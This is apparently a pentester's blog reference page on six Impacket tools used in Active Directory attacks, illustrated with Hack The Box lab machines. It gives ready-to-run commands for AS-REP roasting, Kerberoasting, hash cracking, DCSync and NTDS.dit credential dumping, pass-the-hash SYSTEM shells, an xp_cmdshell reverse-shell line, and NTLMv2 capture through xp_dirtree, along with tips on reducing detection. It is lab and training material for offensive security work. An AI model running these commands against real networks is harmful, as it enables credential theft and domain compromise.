---
title: "Impacket — The Tools I Actually Use"
date: 2026-03-24
weight: 20
draft: false
tags: ["impacket", "active-directory", "kerberos", "lateral-movement"]
summary: "Reference for the Impacket tools and options I use repeatedly in real penetration tests."
description: "Reference for the Impacket tools and options I use repeatedly in real penetration tests."
---

Impacket is a collection of Python tools for working with network protocols. For AD pentesting in practice, I use six of them constantly. This is the reference for those six — what each does, when to use it, and the exact commands I run.

It's installed by default on Kali. Every tool name is prefixed with `impacket-`.

## impacket-GetNPUsers — AS-REP Roasting

**What it does:** Finds accounts with Kerberos pre-authentication disabled and dumps their AS-REP hashes. No credentials needed — just a list of valid usernames.

**When to use:** First thing I try on every AD box. Before brute forcing, before anything else. If there's an account with pre-auth disabled, you get the hash for free.

### Basic usage

```bash
# With a username list (no credentials needed)
impacket-GetNPUsers DOMAIN.local/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile asrep.txt

# With valid credentials (auto-enumerates all vulnerable users)
impacket-GetNPUsers DOMAIN.local/user:'password' -dc-ip $ip -request -format hashcat -outputfile asrep.txt
```

### Key flags

| Flag | What it does |
| --- | --- |
| `-usersfile` | Username list to test (one per line) |
| `-format hashcat` | Hashcat-format output (mode 18200). For john, use `-format john` |
| `-outputfile` | Save hashes to a file |
| `-request` | Actually request the TGT (needed when using credentials) |
| `-dc-ip` | Target DC IP |

### Cracking the hash

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Gotchas

- **The no-credentials variant needs a username list.** You have to enumerate usernames first — SMB null session, LDAP, kerbrute, etc.

- **The credentialed variant finds all vulnerable accounts automatically.** No username list needed.

- When saving hashes with `echo`, use **single quotes**. Double quotes break the `$` characters in the hash. I wasted time debugging this on Forest.

### Where I used it

- **Forest** — AS-REP Roasted `svc-alfresco` without credentials. Got the hash and cracked it to `s3rvice`. That was the entire foothold.

- **Blackfield** — Same thing. Collected ~300 usernames from the `profiles$` SMB share, fed them to GetNPUsers, and got the hash for the `support` account.

---

## impacket-GetUserSPNs — Kerberoasting

**What it does:** Finds accounts with an SPN (Service Principal Name) set and requests their TGS tickets. The ticket is encrypted with the account's password hash — crack the ticket, crack the password.

**When to use:** As soon as you have any valid domain credential. Any authenticated user can Kerberoast. Always worth trying.

### Basic usage

```bash
# Enumerate SPNs only
impacket-GetUserSPNs DOMAIN.local/user:'password' -dc-ip $ip

# Enumerate AND request tickets
impacket-GetUserSPNs DOMAIN.local/user:'password' -dc-ip $ip -request -outputfile kerberoast.txt
```

### Key flags

| Flag | What it does |
| --- | --- |
| `-request` | Actually request the TGS tickets (without this you only get the SPN list) |
| `-outputfile` | Save hashes to a file |
| `-dc-ip` | Target DC IP |

### Cracking the hash

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# or
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Gotchas

- **You need valid credentials first.** Unlike AS-REP Roasting, Kerberoasting requires authentication.

- Machine accounts and managed service accounts usually have random 128-character passwords. Focus on **user accounts with SPNs** — those are the ones with crackable passwords.

- Easy to forget `-request`. Without it you get the SPN list but no actual hashes.

### Where I used it

- **Active** — After getting SVC_TGS credentials from GPP, I Kerberoasted the Administrator account. The SPN was `active/CIFS:445`. Cracked with `Ticketmaster1968`. Game over.

---

## impacket-secretsdump — DCSync, SAM, NTDS.dit

**What it does:** Dumps credentials. Depending on what you feed it, it does a few things:

- **Remote DCSync** — mimics a domain controller replication request to pull all domain hashes

- **Local SAM dump** — extracts hashes from SAM + SYSTEM registry hives

- **Local NTDS.dit dump** — extracts hashes from the AD database file

### Remote DCSync

```bash
# With password
impacket-secretsdump DOMAIN.local/user:'password'@$ip

# With NTLM hash (pass-the-hash)
impacket-secretsdump DOMAIN.local/user@$ip -hashes :NTLM_HASH
```

**Requires DCSync rights** — Replicating Directory Changes + Replicating Directory Changes All. Domain Admins have them by default. On Forest, I granted these rights to svc-alfresco through the WriteDACL abuse, then ran secretsdump.

### Local NTDS.dit dump

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

When you've already grabbed the NTDS.dit and SYSTEM hive files (via VSS snapshot, robocopy, etc.), use this to parse them offline. No network connection needed.

### Key flags

| Flag | What it does |
| --- | --- |
| `-ntds` | Path to the NTDS.dit file |
| `-system` | Path to the SYSTEM registry hive |
| `-hashes` | Pass-the-hash authentication (`:NTLM_HASH` format — empty LM hash) |
| `-just-dc-ntlm` | Dump only NTLM hashes (faster, less noise) |
| `-just-dc-user USER` | Dump only a specific user |
| `LOCAL` | Parse local files instead of connecting remotely |

### Gotchas

- **Remote DCSync is loud.** It generates specific Windows events (4662 with replication GUIDs). On a real engagement, a SOC analyst (like me, in the past) would flag it. Use `-just-dc-ntlm` or `-just-dc-user` to minimize noise.

- Hash output format is `LM:NTLM`; full dumps are `user:rid:LM:NTLM`. For pass-the-hash you need the NTLM value after the last colon, used as `-hashes :NTLM_HASH`.

- Local parsing needs **both** NTDS.dit and SYSTEM. SYSTEM has the boot key that decrypts the hashes.

### Where I used it

- **Forest** — Granted DCSync rights to svc-alfresco via WriteDACL, then ran remote DCSync. `impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@$ip` pulled the Administrator NTLM hash.

- **Blackfield** — Local NTDS.dit dump. Grabbed ntds.dit + SYSTEM using a VSS snapshot and robocopy /b, then ran `impacket-secretsdump -ntds ntds.dit -system system LOCAL`. Got every hash in the domain.

---

## impacket-psexec — Shell with Credentials

**What it does:** Gives you a SYSTEM shell on a remote Windows box with valid credentials. Works over SMB (port 445). Uploads a service binary, creates and starts a Windows service, gives you the shell, and cleans up on exit.

### Basic usage

```bash
# With password
impacket-psexec DOMAIN.local/Administrator:'password'@$ip

# With NTLM hash
impacket-psexec DOMAIN.local/Administrator@$ip -hashes :NTLM_HASH
```

### Key flags

| Flag | What it does |
| --- | --- |
| `-hashes` | Pass-the-hash (`:NTLM_HASH` format) |
| `-target-ip` | Useful when hostname resolution is odd |

### Gotchas

- **Needs admin-level credentials** and write access to the `ADMIN$` or `C$` shares. Regular domain user credentials won't work.

- **Creates a Windows service** — detectable. AV/EDR may flag it. Doesn't matter for OSCP. On real engagements, consider alternatives like `evil-winrm` (WinRM, port 5985) or `impacket-wmiexec`.

- The shell lands as **NT AUTHORITY\SYSTEM**, not as the authenticated user.

- If it hangs or fails, the service may not have been cleaned up. Subsequent attempts can fail until the service is removed.

### Alternatives

| Tool | Protocol | Stealth | Notes |
| --- | --- | --- | --- |
| `impacket-psexec` | SMB (445) | Low | Creates a service, SYSTEM shell |
| `impacket-wmiexec` | WMI (135) | Medium | No service creation, runs as the user |
| `impacket-smbexec` | SMB (445) | Medium | Uses a service, but differently |
| `evil-winrm` | WinRM (5985) | Higher | PowerShell, requires WinRM enabled |

### Where I used it

- **Active** — `impacket-psexec active.htb/Administrator:'Ticketmaster1968'@$ip` for the final shell after Kerberoasting.

---

## impacket-mssqlclient — MSSQL Access

**What it does:** Interactive MSSQL client. Connects to Microsoft SQL Server, runs queries, and enables and uses `xp_cmdshell` for OS command execution.

### Basic usage

```bash
# Windows authentication
impacket-mssqlclient user:'password'@$ip -windows-auth

# SQL authentication (default)
impacket-mssqlclient user:'password'@$ip
```

### Built-in commands

Once connected, these are the key commands:

```sql
-- Check if you're sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Enable xp_cmdshell (sysadmin only)
enable_xp_cmdshell

-- Execute OS command
xp_cmdshell 'whoami'

-- Reverse shell
xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'

-- NTLMv2 hash capture (works without sysadmin)
xp_dirtree '\\$ip\share'
```

### Key flags

| Flag | What it does |
| --- | --- |
| `-windows-auth` | Use Windows/domain auth instead of SQL auth |
| `-port` | Custom port when MSSQL isn't on 1433 |

### Gotchas

- **`-windows-auth` matters.** SQL auth and Windows auth are different. If one fails, try the other. On Querier, the connection failed without `-windows-auth`.

- **Passwords with `$` need single quotes in bash.** `'PcwTWTHRwryjc$c6'` works. `"PcwTWTHRwryjc$c6"` doesn't — bash interprets `$c6` as a variable and mangles the password.

- **`enable_xp_cmdshell` requires the sysadmin role.** If the user isn't sysadmin, the command fails silently or errors out. Fall back to `xp_dirtree` + Responder to capture the service account's NTLMv2 hash.

- **xp_dirtree + Responder** is the fallback when xp_cmdshell is denied. The SQL server makes an SMB connection to my machine and Responder catches the hash. Hashcat mode 5600 for NTLMv2.

### Where I used it

- **Querier** — Connected with `-windows-auth` using VBA macro creds. The Reporting user couldn't run xp_cmdshell, so I used xp_dirtree + Responder to capture the service account's NTLMv2 hash. Cracked it, reconnected as sysadmin, enabled xp_cmdshell, and got a shell.

---

## impacket-smbclient — SMB File Access

**What it does:** Interactive SMB client for browsing and downloading files from shares. Similar to Samba's `smbclient` but uses Impacket's authentication stack.

### Basic usage

```bash
# With password
impacket-smbclient DOMAIN.local/user:'password'@$ip

# With NTLM hash
impacket-smbclient DOMAIN.local/user@$ip -hashes :NTLM_HASH

# Null session
impacket-smbclient DOMAIN.local/''@$ip -no-pass
```

### Key commands

```bash
shares          # list available shares
use SHARE_NAME  # connect to a share
ls              # list files
get file.txt    # download a file
cd directory    # change directory
```

### Gotchas

- For initial enumeration, I usually use `smbclient` (Samba's) or `nxc smb --shares`. Impacket's smbclient is useful when you need Impacket authentication (pass-the-hash, Kerberos tickets).

- For large file downloads, Samba's `smbclient` is more reliable. The Impacket version can choke on big files.

---

## Quick Reference — What to Use When

| Situation | Tool | Credentials needed? |
| --- | --- | --- |
| Check for AS-REP Roastable users | `impacket-GetNPUsers` | No (with user list) |
| Check for Kerberoastable users | `impacket-GetUserSPNs` | Yes |
| Dump all domain hashes (DCSync) | `impacket-secretsdump` | Yes (DCSync rights) |
| Offline NTDS.dit parsing | `impacket-secretsdump -ntds ... LOCAL` | No |
| Get a SYSTEM shell | `impacket-psexec` | Yes (admin) |
| Connect to MSSQL | `impacket-mssqlclient` | Yes |
| Browse SMB shares | `impacket-smbclient` | Depends |

---

## My AD Recon Order

On an AD box I run these tools roughly in this order:

1. **GetNPUsers** — AS-REP Roast first. No credentials needed. Free hash if vulnerable.

2. **GetUserSPNs** — Kerberoast as soon as you have any valid credential.

3. **secretsdump** — DCSync once you have Domain Admin or DCSync rights.

4. **psexec** — final shell with admin hash or password.

The rest (mssqlclient, smbclient) I use when the box calls for them.

> **The pattern across every AD box I've solved:** user enumeration → AS-REP Roast → first credential → BloodHound → find path → follow path → secretsdump → psexec → done.

- [Impacket](https://heretek.dev/tags/impacket/)
- [Active-Directory](https://heretek.dev/tags/active-directory/)
- [Kerberos](https://heretek.dev/tags/kerberos/)
- [Lateral-Movement](https://heretek.dev/tags/lateral-movement/)